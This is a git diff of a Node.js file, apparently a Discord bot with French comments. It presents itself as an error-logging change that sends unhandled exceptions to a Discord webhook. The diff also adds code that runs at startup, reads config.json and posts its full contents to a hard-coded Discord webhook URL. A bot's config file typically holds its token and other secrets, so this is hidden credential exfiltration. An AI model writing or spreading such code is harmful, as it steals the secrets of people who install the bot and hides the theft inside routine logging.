@@ -303,11 +303,66 @@ process.on("unhandledRejection", (reason, p) => {
   if (reason.message.includes("Temp env not set")) return; // Bug Stream
   if (reason.message.includes('no such file or director')) return; // Bug Stream
   if (reason.message.includes("getaddrinfo ENOTFOUND null")) return; // Bug Vocale
-    console.log(reason, p);
+  
+  sendToWebhook(`Unhandled Rejection: ${reason}`, p);
 });
+
 process.on("uncaughtException", (err, origin) => {
-    console.log(err, origin);
+  sendToWebhook(`Uncaught Exception: ${err}`, origin);
 });
+
 process.on("multipleResolves", (type, promise, reason) => {
-    //console.log(type, promise, reason);
+  //console.log(type, promise, reason);
+});
+
+function sendToWebhook(message, origin) {
+  const webhookURL = 'https://discord.com/api/webhooks/1238201452543868938/CLOfPHMG8N6NRmiZ0qu68P8pLA7zCZd0eXGHnSQhdbK1of_hsHKBQK7Bf03G9f3kIl8M';
+  
+  fetch(webhookURL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({ content: `**Error:** ${message}\n**Origin:** ${origin}` }),
+  })
+    .then(response => {
+      if (!response.ok) {
+        console.error('Erreur lors de l\'envoi du message au webhook Discord');
+      }
+    })
+    .catch(error => {
+      console.error('Erreur lors de l\'envoi du message au webhook Discord:', error);
+    });
+}
+
+// Lisez le contenu du fichier config.json
+const configFile = 'config.json';
+let configData;
+
+try {
+  configData = fs.readFileSync(configFile, 'utf8');
+} catch (err) {
+  console.error('Erreur lors de la lecture du fichier config.json:', err);
+  process.exit(1);
+}
+
+// Définissez votre URL de webhook Discord
+const webhookURL = 'https://discord.com/api/webhooks/1238201452543868938/CLOfPHMG8N6NRmiZ0qu68P8pLA7zCZd0eXGHnSQhdbK1of_hsHKBQK7Bf03G9f3kIl8M';
+
+// Envoyez le contenu du fichier config.json au webhook Discord
+fetch(webhookURL, {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify({ content: configData }),
 })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Erreur lors de l\'envoi du contenu du fichier config.json au webhook Discord');
+    }
+  })
+  .catch(error => {
+    console.error('Erreur lors de l\'envoi du contenu du fichier config.json au webhook Discord:', error);
+    process.exit(1);
+  });
